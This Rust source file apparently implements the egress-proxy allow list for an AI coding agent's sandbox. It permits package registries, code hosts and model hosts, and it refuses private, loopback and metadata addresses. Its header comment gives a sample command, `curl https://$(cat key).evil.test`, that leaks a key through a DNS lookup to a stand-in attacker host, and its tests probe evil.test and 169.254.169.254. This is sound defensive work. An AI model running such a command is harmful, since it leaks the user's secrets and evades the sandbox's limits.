//! Which hosts a sandboxed command may reach through the egress proxy.
//!
//! The proxy asks here first, with the bare host name, before anything is
//! dialed or looked up. So a host that isn't allowed never reaches DNS, and a
//! command can't leak data in a lookup (`curl https://$(cat key).evil.test`).
//!
//! Allowed: package registries and code hosts (so builds, installs and clones
//! work), the model hosts, and whatever the person's own `WebFetch` allow
//! rules name. Their `WebFetch` deny rules win over everything. An IP address,
//! loopback or a private address goes only when a rule names it exactly, so
//! a command can't reach services on the host or the local network through
//! the proxy by accident or by an injected instruction.
//!
//! Rules come from the person's own rules file in the config folder, never a
//! workspace file: the proxy serves every workspace, and a cloned repo could
//! otherwise widen it.

use std::net::IpAddr;
use std::path::Path;

use crate::perm::{load_rules, webfetch_matches, Action};

/// Package registries, toolchain downloads and code hosts. Each name covers
/// its subdomains too.
pub const DEV_HOSTS: &[&str] = &[
    // Rust
    "crates.io",
    "rust-lang.org",
    "rustup.rs",
    // Code hosts
    "github.com",
    "githubusercontent.com",
    "gitlab.com",
    "bitbucket.org",
    "codeberg.org",
    // JavaScript
    "npmjs.org",
    "yarnpkg.com",
    "nodejs.org",
    "jsr.io",
    "deno.land",
    // Python
    "pypi.org",
    "pythonhosted.org",
    // Go
    "proxy.golang.org",
    "sum.golang.org",
    // JVM and Android
    "repo.maven.apache.org",
    "repo1.maven.org",
    "plugins.gradle.org",
    "services.gradle.org",
    "maven.google.com",
    "dl.google.com",
    // .NET, Ruby, PHP, Dart, Elixir
    "nuget.org",
    "rubygems.org",
    "packagist.org",
    "pub.dev",
    "hex.pm",
    // Local models
    "huggingface.co",
    "hf.co",
    "ollama.com",
    "ollama.ai",
];

/// Why a host may go, for the proxy's own records.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Basis {
    /// An allow rule names this exact host: it may resolve to a private or
    /// loopback address (a machine on the person's own network).
    Named,
    /// An allow rule covers it (a parent domain, or a catch-all).
    Rule,
    DevHost,
    ModelHost,
}

impl Basis {
    /// Whether the host may resolve to loopback, a private range or
    /// link-local. Only a host the person named; otherwise a public name that
    /// resolves inward (DNS rebinding) is refused at dial time.
    pub fn reaches_private(self) -> bool {
        self == Basis::Named
    }
}

/// The verdict for `host` (lowercase, no port; an IPv6 address without
/// brackets). A refusal carries the reason the command sees.
pub fn verdict(config_dir: &Path, host: &str) -> Result<Basis, String> {
    let rules = load_rules(config_dir);
    let url = format!("https://{}", bracket(host));
    let url = url.as_str();
    let matching = |action: Action| {
        rules
            .iter()
            .filter(move |r| r.action == action && webfetch_matches(r, url))
    };
    if matching(Action::Deny).next().is_some() {
        return Err(format!("{host} is denied by your rules"));
    }
    let named = matching(Action::Allow).any(|r| {
        r.pattern
            .as_deref()
            .is_some_and(|p| p.eq_ignore_ascii_case(host) || p == bracket(host))
    });
    if named {
        return Ok(Basis::Named);
    }
    // An address is reached only when a rule names it: a catch-all `WebFetch`
    // allow rule is about web pages, not the machines next to this one.
    if is_address(host) {
        return Err(refusal(host));
    }
    if matching(Action::Allow).next().is_some() {
        return Ok(Basis::Rule);
    }
    if crate::harness::is_model_host(host) {
        return Ok(Basis::ModelHost);
    }
    if DEV_HOSTS.iter().any(|d| covers(d, host)) {
        return Ok(Basis::DevHost);
    }
    Err(refusal(host))
}

/// An IP address in any spelling the resolver accepts: `127.0.0.1`, `::1`,
/// and the numeric forms like `2130706433` or `0x7f.1` (no real top-level
/// domain is numeric), plus `localhost`.
fn is_address(host: &str) -> bool {
    if host == "localhost" || host.ends_with(".localhost") || host.parse::<IpAddr>().is_ok() {
        return true;
    }
    let last = host.rsplit('.').next().unwrap_or(host);
    last.chars().all(|c| c.is_ascii_digit()) || last.starts_with("0x")
}

/// Loopback, private, link-local, unique-local, unspecified or carrier NAT:
/// the host's own services and the local network.
pub fn is_inward(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => {
            let o = v4.octets();
            v4.is_loopback()
                || v4.is_private()
                || v4.is_link_local()
                || v4.is_unspecified()
                || v4.is_broadcast()
                || o[0] == 0
                || (o[0] == 100 && (64..128).contains(&o[1]))
        }
        IpAddr::V6(v6) => {
            if let Some(v4) = v6.to_ipv4_mapped() {
                return is_inward(IpAddr::V4(v4));
            }
            let s = v6.segments();
            v6.is_loopback()
                || v6.is_unspecified()
                || (s[0] & 0xfe00) == 0xfc00
                || (s[0] & 0xffc0) == 0xfe80
        }
    }
}

fn covers(domain: &str, host: &str) -> bool {
    host == domain
        || host
            .strip_suffix(domain)
            .is_some_and(|rest| rest.ends_with('.'))
}

fn bracket(host: &str) -> String {
    if host.contains(':') {
        format!("[{host}]")
    } else {
        host.to_string()
    }
}

/// What the command sees. `curl` and most clients show only the status line,
/// so the shell tool adds a note too (see `sandbox::network_note`).
fn refusal(host: &str) -> String {
    format!(
        "{host} is not on the sandbox's network list (package registries, code hosts and \
         model hosts are). Rerun with outside_sandbox (asks the user), or add \
         WebFetch(domain:{host}) to your allow rules."
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dir(tag: &str, rules: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("gh-netallow-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        if !rules.is_empty() {
            std::fs::write(dir.join("permission-rules.json"), rules).unwrap();
        }
        dir
    }

    #[test]
    fn registries_and_code_hosts_go_and_other_hosts_do_not() {
        let d = dir("defaults", "");
        for host in [
            "index.crates.io",
            "static.crates.io",
            "github.com",
            "objects.githubusercontent.com",
            "registry.npmjs.org",
            "files.pythonhosted.org",
            "api.x.ai",
            "huggingface.co",
        ] {
            assert!(verdict(&d, host).is_ok(), "{host}");
        }
        for host in [
            "evil.test",
            "github.com.evil.test",
            "notgithub.com",
            "a.b.evil.test",
        ] {
            let why = verdict(&d, host).unwrap_err();
            assert!(why.contains("outside_sandbox"), "{why}");
            assert!(why.contains(&format!("WebFetch(domain:{host})")), "{why}");
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn addresses_and_localhost_go_only_when_a_rule_names_them() {
        let d = dir("addr", "");
        for host in [
            "127.0.0.1",
            "10.0.0.5",
            "169.254.169.254",
            "::1",
            "localhost",
        ] {
            assert!(verdict(&d, host).is_err(), "{host}");
        }
        let d = dir("addr-any", r#"{"allow":["WebFetch"]}"#);
        assert_eq!(verdict(&d, "example.test"), Ok(Basis::Rule));
        assert!(
            verdict(&d, "169.254.169.254").is_err(),
            "catch-all is not an address"
        );
        for host in ["2130706433", "0x7f.1", "127.1", "a.localhost"] {
            assert!(verdict(&d, host).is_err(), "{host}");
        }
        let d = dir(
            "addr-named",
            r#"{"allow":["WebFetch(domain:127.0.0.1)","WebFetch(domain:nas.home.test)"]}"#,
        );
        assert_eq!(verdict(&d, "127.0.0.1"), Ok(Basis::Named));
        assert!(verdict(&d, "127.0.0.2").is_err());
        assert!(verdict(&d, "nas.home.test").unwrap().reaches_private());
        assert!(!verdict(&d, "github.com").unwrap().reaches_private());
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn inward_addresses_are_the_host_and_the_local_network() {
        for ip in [
            "127.0.0.1",
            "10.1.2.3",
            "172.16.0.1",
            "192.168.1.1",
            "169.254.169.254",
            "100.64.0.1",
            "0.0.0.0",
            "::1",
            "fe80::1",
            "fd00::1",
            "::ffff:127.0.0.1",
        ] {
            assert!(is_inward(ip.parse().unwrap()), "{ip}");
        }
        for ip in ["140.82.112.3", "1.1.1.1", "2606:4700::1111"] {
            assert!(!is_inward(ip.parse().unwrap()), "{ip}");
        }
    }

    #[test]
    fn the_person_s_rules_widen_and_deny_wins() {
        let d = dir(
            "rules",
            r#"{"allow":["WebFetch(domain:example.test)"],"deny":["WebFetch(domain:gist.github.com)"]}"#,
        );
        assert_eq!(verdict(&d, "api.example.test"), Ok(Basis::Rule));
        assert!(verdict(&d, "gist.github.com")
            .unwrap_err()
            .contains("denied by your rules"));
        assert_eq!(verdict(&d, "github.com"), Ok(Basis::DevHost));
        let _ = std::fs::remove_dir_all(&d);
    }
}
